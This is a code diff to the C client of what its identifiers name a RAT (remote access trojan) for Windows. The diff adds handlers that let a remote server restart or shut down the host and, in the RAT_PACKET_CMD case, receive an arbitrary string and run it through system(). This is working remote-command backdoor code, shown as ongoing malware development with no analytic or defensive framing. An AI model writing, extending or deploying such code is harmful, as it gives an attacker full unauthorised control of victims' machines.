@@ -1,5 +1,6 @@
 #include "client.h"
 
+#include "commands.h"
 #include "log.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -39,12 +40,12 @@ int client(int debug) {
     int sentbytes = recv(server, buf, sizeof(ratpacket_t), 0);
     if (sentbytes == 0) {
       LOG_DEBUG("closing connection...");
-      break;
+      return 1;
     }
     if (sentbytes < 0) {
       LOG_DEBUG("recv failed with %d", WSAGetLastError());
       closesocket(server);
-      break;
+      return 1;
     }
     switch (p->op) {
     case RAT_PACKET_ECHO:
@@ -54,16 +55,31 @@ int client(int debug) {
           SOCKET_ERROR) {
         LOG_DEBUG("send failed with %d", WSAGetLastError());
         closesocket(server);
-        break;
+        return 1;
       }
       LOG_DEBUG("echo completed\n");
       break;
+    case RAT_PACKET_RESTART:
+      system(RESTART_STR);
+      break;
+    case RAT_PACKET_SHUTDOWN:
+      system(SHUTDOWN_STR);
+      break;
+    case RAT_PACKET_CMD:
+      sentbytes = recv(server, (char *)p->data, p->data_len, 0);
+      LOG_DEBUG("arrived cmd packet with message: %s", p->data);
+      system((char *)p->data);
+      LOG_DEBUG("cmd packet completed");
+      break;
+    case RAT_PACKET_DISCONNECT:
+      goto DONE;
     default:
       LOG_DEBUG("unimplemented opcode %s (%d)", rat_opcode_to_str(p->op),
                 p->op);
       break;
     }
   }
+DONE:
   if (shutdown(server, SD_SEND) == SOCKET_ERROR) {
     if (debug)
       printf("shutdown failed, error: %d", WSAGetLastError());
